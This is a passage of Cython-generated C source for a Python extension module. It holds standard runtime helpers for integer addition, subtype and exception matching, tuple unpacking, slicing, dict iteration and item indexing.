    CYTHON_MAYBE_UNUSED_VAR(intval);
    CYTHON_MAYBE_UNUSED_VAR(inplace);
    CYTHON_UNUSED_VAR(zerodivision_check);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
        
            x = (long)((unsigned long)a + (unsigned long)b);
            if (likely((x^a) >= 0 || (x^b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        if (unlikely(__Pyx_PyLong_IsZero(op1))) {
            return __Pyx_NewRef(op2);
        }
        if (likely(__Pyx_PyLong_IsCompact(op1))) {
            a = __Pyx_PyLong_CompactValue(op1);
        } else {
            const digit* digits = __Pyx_PyLong_Digits(op1);
            const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(op1);
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
                x = a + b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla + llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
#if CYTHON_COMPILING_IN_LIMITED_API
        double a = __pyx_PyFloat_AsDouble(op1);
#else
        double a = PyFloat_AS_DOUBLE(op1);
#endif
            double result;
            
            PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = __Pyx_PyType_GetSlot(a, tp_base, PyTypeObject*);
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
static CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (cls == a || cls == b) return 1;
    mro = cls->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            PyObject *base = PyTuple_GET_ITEM(mro, i);
            if (base == (PyObject *)a || base == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(cls, a) || __Pyx_InBases(cls, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    if (exc_type1) {
        return __Pyx_IsAnySubtype2((PyTypeObject*)err, (PyTypeObject*)exc_type1, (PyTypeObject*)exc_type2);
    } else {
        return __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* RaiseUnboundLocalError */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname) {
    PyErr_Format(PyExc_UnboundLocalError, "local variable '%s' referenced before assignment", varname);
}

/* RaiseTooManyValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected) {
    PyErr_Format(PyExc_ValueError,
                 "too many values to unpack (expected %" CYTHON_FORMAT_SSIZE_T "d)", expected);
}

/* RaiseNeedMoreValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index) {
    PyErr_Format(PyExc_ValueError,
                 "need more than %" CYTHON_FORMAT_SSIZE_T "d value%.1s to unpack",
                 index, (index == 1) ? "" : "s");
}

/* IterFinish */
static CYTHON_INLINE int __Pyx_IterFinish(void) {
    PyObject* exc_type;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    exc_type = __Pyx_PyErr_CurrentExceptionType();
    if (unlikely(exc_type)) {
        if (unlikely(!__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration)))
            return -1;
        __Pyx_PyErr_Clear();
        return 0;
    }
    return 0;
}

/* UnpackItemEndCheck */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected) {
    if (unlikely(retval)) {
        Py_DECREF(retval);
        __Pyx_RaiseTooManyValuesError(expected);
        return -1;
    }
    return __Pyx_IterFinish();
}

/* PyObjectCallNoArg */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
    PyObject *arg[2] = {NULL, NULL};
    return __Pyx_PyObject_FastCall(func, arg + 1, 0 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);
}

/* pep479 */
static void __Pyx_Generator_Replace_StopIteration(int in_async_gen) {
    PyObject *exc, *val, *tb, *cur_exc;
    __Pyx_PyThreadState_declare
    #ifdef __Pyx_StopAsyncIteration_USED
    int is_async_stopiteration = 0;
    #endif
    CYTHON_MAYBE_UNUSED_VAR(in_async_gen);
    cur_exc = PyErr_Occurred();
    if (likely(!__Pyx_PyErr_GivenExceptionMatches(cur_exc, PyExc_StopIteration))) {
        #ifdef __Pyx_StopAsyncIteration_USED
        if (in_async_gen && unlikely(__Pyx_PyErr_GivenExceptionMatches(cur_exc, __Pyx_PyExc_StopAsyncIteration))) {
            is_async_stopiteration = 1;
        } else
        #endif
            return;
    }
    __Pyx_PyThreadState_assign
    __Pyx_GetException(&exc, &val, &tb);
    Py_XDECREF(exc);
    Py_XDECREF(val);
    Py_XDECREF(tb);
    PyErr_SetString(PyExc_RuntimeError,
        #ifdef __Pyx_StopAsyncIteration_USED
        is_async_stopiteration ? "async generator raised StopAsyncIteration" :
        in_async_gen ? "async generator raised StopIteration" :
        #endif
        "generator raised StopIteration");
}

/* StringJoin */
static CYTHON_INLINE PyObject* __Pyx_PyBytes_Join(PyObject* sep, PyObject* values) {
    (void) __Pyx_PyObject_CallMethod1;
#if CYTHON_COMPILING_IN_CPYTHON && PY_MAJOR_VERSION < 3
    return _PyString_Join(sep, values);
#elif CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030d0000
    return _PyBytes_Join(sep, values);
#else
    return __Pyx_PyObject_CallMethod1(sep, __pyx_n_s_join, values);
#endif
}

/* SliceObject */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,
        Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,
        int has_cstart, int has_cstop, int wraparound) {
    __Pyx_TypeName obj_type_name;
#if CYTHON_USE_TYPE_SLOTS
    PyMappingMethods* mp;
#if PY_MAJOR_VERSION < 3
    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;
    if (likely(ms && ms->sq_slice)) {
        if (!has_cstart) {
            if (_py_start && (*_py_start != Py_None)) {
                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);
                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstart = 0;
        }
        if (!has_cstop) {
            if (_py_stop && (*_py_stop != Py_None)) {
                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);
                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstop = PY_SSIZE_T_MAX;
        }
        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {
            Py_ssize_t l = ms->sq_length(obj);
            if (likely(l >= 0)) {
                if (cstop < 0) {
                    cstop += l;
                    if (cstop < 0) cstop = 0;
                }
                if (cstart < 0) {
                    cstart += l;
                    if (cstart < 0) cstart = 0;
                }
            } else {
                if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                    goto bad;
                PyErr_Clear();
            }
        }
        return ms->sq_slice(obj, cstart, cstop);
    }
#else
    CYTHON_UNUSED_VAR(wraparound);
#endif
    mp = Py_TYPE(obj)->tp_as_mapping;
    if (likely(mp && mp->mp_subscript))
#else
    CYTHON_UNUSED_VAR(wraparound);
#endif
    {
        PyObject* result;
        PyObject *py_slice, *py_start, *py_stop;
        if (_py_slice) {
            py_slice = *_py_slice;
        } else {
            PyObject* owned_start = NULL;
            PyObject* owned_stop = NULL;
            if (_py_start) {
                py_start = *_py_start;
            } else {
                if (has_cstart) {
                    owned_start = py_start = PyInt_FromSsize_t(cstart);
                    if (unlikely(!py_start)) goto bad;
                } else
                    py_start = Py_None;
            }
            if (_py_stop) {
                py_stop = *_py_stop;
            } else {
                if (has_cstop) {
                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);
                    if (unlikely(!py_stop)) {
                        Py_XDECREF(owned_start);
                        goto bad;
                    }
                } else
                    py_stop = Py_None;
            }
            py_slice = PySlice_New(py_start, py_stop, Py_None);
            Py_XDECREF(owned_start);
            Py_XDECREF(owned_stop);
            if (unlikely(!py_slice)) goto bad;
        }
#if CYTHON_USE_TYPE_SLOTS
        result = mp->mp_subscript(obj, py_slice);
#else
        result = PyObject_GetItem(obj, py_slice);
#endif
        if (!_py_slice) {
            Py_DECREF(py_slice);
        }
        return result;
    }
    obj_type_name = __Pyx_PyType_GetName(Py_TYPE(obj));
    PyErr_Format(PyExc_TypeError,
        "'" __Pyx_FMT_TYPENAME "' object is unsliceable", obj_type_name);
    __Pyx_DECREF_TypeName(obj_type_name);
bad:
    return NULL;
}

/* PyObjectCallMethod0 */
static PyObject* __Pyx_PyObject_CallMethod0(PyObject* obj, PyObject* method_name) {
    PyObject *method = NULL, *result = NULL;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_CallOneArg(method, obj);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) goto bad;
    result = __Pyx_PyObject_CallNoArg(method);
    Py_DECREF(method);
bad:
    return result;
}

/* RaiseNoneIterError */
static CYTHON_INLINE void __Pyx_RaiseNoneNotIterableError(void) {
    PyErr_SetString(PyExc_TypeError, "'NoneType' object is not iterable");
}

/* UnpackTupleError */
static void __Pyx_UnpackTupleError(PyObject *t, Py_ssize_t index) {
    if (t == Py_None) {
      __Pyx_RaiseNoneNotIterableError();
    } else if (PyTuple_GET_SIZE(t) < index) {
      __Pyx_RaiseNeedMoreValuesError(PyTuple_GET_SIZE(t));
    } else {
      __Pyx_RaiseTooManyValuesError(index);
    }
}

/* UnpackTuple2 */
static CYTHON_INLINE int __Pyx_unpack_tuple2_exact(
        PyObject* tuple, PyObject** pvalue1, PyObject** pvalue2, int decref_tuple) {
    PyObject *value1 = NULL, *value2 = NULL;
#if CYTHON_COMPILING_IN_PYPY
    value1 = PySequence_ITEM(tuple, 0);  if (unlikely(!value1)) goto bad;
    value2 = PySequence_ITEM(tuple, 1);  if (unlikely(!value2)) goto bad;
#else
    value1 = PyTuple_GET_ITEM(tuple, 0);  Py_INCREF(value1);
    value2 = PyTuple_GET_ITEM(tuple, 1);  Py_INCREF(value2);
#endif
    if (decref_tuple) {
        Py_DECREF(tuple);
    }
    *pvalue1 = value1;
    *pvalue2 = value2;
    return 0;
#if CYTHON_COMPILING_IN_PYPY
bad:
    Py_XDECREF(value1);
    Py_XDECREF(value2);
    if (decref_tuple) { Py_XDECREF(tuple); }
    return -1;
#endif
}
static int __Pyx_unpack_tuple2_generic(PyObject* tuple, PyObject** pvalue1, PyObject** pvalue2,
                                       int has_known_size, int decref_tuple) {
    Py_ssize_t index;
    PyObject *value1 = NULL, *value2 = NULL, *iter = NULL;
    iternextfunc iternext;
    iter = PyObject_GetIter(tuple);
    if (unlikely(!iter)) goto bad;
    if (decref_tuple) { Py_DECREF(tuple); tuple = NULL; }
    iternext = __Pyx_PyObject_GetIterNextFunc(iter);
    value1 = iternext(iter); if (unlikely(!value1)) { index = 0; goto unpacking_failed; }
    value2 = iternext(iter); if (unlikely(!value2)) { index = 1; goto unpacking_failed; }
    if (!has_known_size && unlikely(__Pyx_IternextUnpackEndCheck(iternext(iter), 2))) goto bad;
    Py_DECREF(iter);
    *pvalue1 = value1;
    *pvalue2 = value2;
    return 0;
unpacking_failed:
    if (!has_known_size && __Pyx_IterFinish() == 0)
        __Pyx_RaiseNeedMoreValuesError(index);
bad:
    Py_XDECREF(iter);
    Py_XDECREF(value1);
    Py_XDECREF(value2);
    if (decref_tuple) { Py_XDECREF(tuple); }
    return -1;
}

/* dict_iter */
#if CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
#include <string.h>
#endif
static CYTHON_INLINE PyObject* __Pyx_dict_iterator(PyObject* iterable, int is_dict, PyObject* method_name,
                                                   Py_ssize_t* p_orig_length, int* p_source_is_dict) {
    is_dict = is_dict || likely(PyDict_CheckExact(iterable));
    *p_source_is_dict = is_dict;
    if (is_dict) {
#if !CYTHON_COMPILING_IN_PYPY
        *p_orig_length = PyDict_Size(iterable);
        Py_INCREF(iterable);
        return iterable;
#elif PY_MAJOR_VERSION >= 3
        static PyObject *py_items = NULL, *py_keys = NULL, *py_values = NULL;
        PyObject **pp = NULL;
        if (method_name) {
            const char *name = PyUnicode_AsUTF8(method_name);
            if (strcmp(name, "iteritems") == 0) pp = &py_items;
            else if (strcmp(name, "iterkeys") == 0) pp = &py_keys;
            else if (strcmp(name, "itervalues") == 0) pp = &py_values;
            if (pp) {
                if (!*pp) {
                    *pp = PyUnicode_FromString(name + 4);
                    if (!*pp)
                        return NULL;
                }
                method_name = *pp;
            }
        }
#endif
    }
    *p_orig_length = 0;
    if (method_name) {
        PyObject* iter;
        iterable = __Pyx_PyObject_CallMethod0(iterable, method_name);
        if (!iterable)
            return NULL;
#if !CYTHON_COMPILING_IN_PYPY
        if (PyTuple_CheckExact(iterable) || PyList_CheckExact(iterable))
            return iterable;
#endif
        iter = PyObject_GetIter(iterable);
        Py_DECREF(iterable);
        return iter;
    }
    return PyObject_GetIter(iterable);
}
static CYTHON_INLINE int __Pyx_dict_iter_next(
        PyObject* iter_obj, CYTHON_NCP_UNUSED Py_ssize_t orig_length, CYTHON_NCP_UNUSED Py_ssize_t* ppos,
        PyObject** pkey, PyObject** pvalue, PyObject** pitem, int source_is_dict) {
    PyObject* next_item;
#if !CYTHON_COMPILING_IN_PYPY
    if (source_is_dict) {
        PyObject *key, *value;
        if (unlikely(orig_length != PyDict_Size(iter_obj))) {
            PyErr_SetString(PyExc_RuntimeError, "dictionary changed size during iteration");
            return -1;
        }
        if (unlikely(!PyDict_Next(iter_obj, ppos, &key, &value))) {
            return 0;
        }
        if (pitem) {
            PyObject* tuple = PyTuple_New(2);
            if (unlikely(!tuple)) {
                return -1;
            }
            Py_INCREF(key);
            Py_INCREF(value);
            PyTuple_SET_ITEM(tuple, 0, key);
            PyTuple_SET_ITEM(tuple, 1, value);
            *pitem = tuple;
        } else {
            if (pkey) {
                Py_INCREF(key);
                *pkey = key;
            }
            if (pvalue) {
                Py_INCREF(value);
                *pvalue = value;
            }
        }
        return 1;
    } else if (PyTuple_CheckExact(iter_obj)) {
        Py_ssize_t pos = *ppos;
        if (unlikely(pos >= PyTuple_GET_SIZE(iter_obj))) return 0;
        *ppos = pos + 1;
        next_item = PyTuple_GET_ITEM(iter_obj, pos);
        Py_INCREF(next_item);
    } else if (PyList_CheckExact(iter_obj)) {
        Py_ssize_t pos = *ppos;
        if (unlikely(pos >= PyList_GET_SIZE(iter_obj))) return 0;
        *ppos = pos + 1;
        next_item = PyList_GET_ITEM(iter_obj, pos);
        Py_INCREF(next_item);
    } else
#endif
    {
        next_item = PyIter_Next(iter_obj);
        if (unlikely(!next_item)) {
            return __Pyx_IterFinish();
        }
    }
    if (pitem) {
        *pitem = next_item;
    } else if (pkey && pvalue) {
        if (__Pyx_unpack_tuple2(next_item, pkey, pvalue, source_is_dict, source_is_dict, 1))
            return -1;
    } else if (pkey) {
        *pkey = next_item;
    } else {
        *pvalue = next_item;
    }
    return 1;
}

/* GetItemInt */
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (unlikely(!j)) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PyMappingMethods *mm = Py_TYPE(o)->tp_as_mapping;
        PySequenceMethods *sm = Py_TYPE(o)->tp_as_sequence;
        if (mm && mm->mp_subscript) {
            PyObject *r, *key = PyInt_FromSsize_t(i);
            if (unlikely(!key)) return NULL;
            r = mm->mp_subscript(o, key);
            Py_DECREF(key);
            return r;
        }
        if (likely(sm && sm->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(sm->sq_length)) {
                Py_ssize_t l = sm->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return sm->sq_item(o, i);
        }
    }
#else
    if (is_list || !PyMapping_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

/* FixUpExtensionType */
#if CYTHON_USE_TYPE_SPECS
static int __Pyx_fix_up_extension_type_from_spec(PyType_Spec *spec, PyTypeObject *type) {
#if PY_VERSION_HEX > 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API
    CYTHON_UNUSED_VAR(spec);
    CYTHON_UNUSED_VAR(type);
#else
    const PyType_Slot *slot = spec->slots;
    while (slot && slot->slot && slot->slot != Py_tp_members)
        slot++;
    if (slot && slot->slot == Py_tp_members) {
        int changed = 0;
#if !(PY_VERSION_HEX <= 0x030900b1 && CYTHON_COMPILING_IN_CPYTHON)
        const
#endif
            PyMemberDef *memb = (PyMemberDef*) slot->pfunc;
        while (memb && memb->name) {
            if (memb->name[0] == '_' && memb->name[1] == '_') {
#if PY_VERSION_HEX < 0x030900b1
                if (strcmp(memb->name, "__weaklistoffset__") == 0) {
                    assert(memb->type == T_PYSSIZET);
                    assert(memb->flags == READONLY);
                    type->tp_weaklistoffset = memb->offset;
                    changed = 1;
                }
                else if (strcmp(memb->name, "__dictoffset__") == 0) {
                    assert(memb->type == T_PYSSIZET);
                    assert(memb->flags == READONLY);
                    type->tp_dictoffset = memb->offset;
                    changed = 1;
                }
#if CYTHON_METH_FASTCALL
                else if (strcmp(memb->name, "__vectorcalloffset__") == 0) {
                    assert(memb->type == T_PYSSIZET);
                    assert(memb->flags == READONLY);
#if PY_VERSION_HEX >= 0x030800b4
                    type->tp_vectorcall_offset = memb->offset;
#else
                    type->tp_print = (printfunc) memb->offset;
#endif
                    changed = 1;
                }
#endif
#else
                if ((0));
#endif
#if PY_VERSION_HEX <= 0x030900b1 && CYTHON_COMPILING_IN_CPYTHON
                else if (strcmp(memb->name, "__module__") == 0) {
                    PyObject *descr;
                    assert(memb->type == T_OBJECT);
                    assert(memb->flags == 0 || memb->flags == READONLY);
                    descr = PyDescr_NewMember(type, memb);
                    if (unlikely(!descr))
                        return -1;
                    if (unlikely(PyDict_SetItem(type->tp_dict, PyDescr_NAME(descr), descr) < 0)) {
                        Py_DECREF(descr);
                        return -1;
                    }
                    Py_DECREF(descr);
                    changed = 1;
                }
#endif
            }
            memb++;
        }
        if (changed)
            PyType_Modified(type);
    }
#endif
    return 0;
}
#endif

/* ValidateBasesTuple */
#if CYTHON_COMPILING_IN_CPYTHON || CYTHON_COMPILING_IN_LIMITED_API || CYTHON_USE_TYPE_SPECS
static int __Pyx_validate_bases_tuple(const char *type_name, Py_ssize_t dictoffset, PyObject *bases) {
    Py_ssize_t i, n;
#if CYTHON_ASSUME_SAFE_MACROS
    n = PyTuple_GET_SIZE(bases);
#else
    n = PyTuple_Size(bases);
    if (n < 0) return -1;
#endif
    for (i = 1; i < n; i++)
    {
#if CYTHON_AVOID_BORROWED_REFS
        PyObject *b0 = PySequence_GetItem(bases, i);
        if (!b0) return -1;
#elif CYTHON_ASSUME_SAFE_MACROS
        PyObject *b0 = PyTuple_GET_ITEM(bases, i);
#else
        PyObject *b0 = PyTuple_GetItem(bases, i);
        if (!b0) return -1;
#endif
        PyTypeObject *b;
#if PY_MAJOR_VERSION < 3
        if (PyClass_Check(b0))
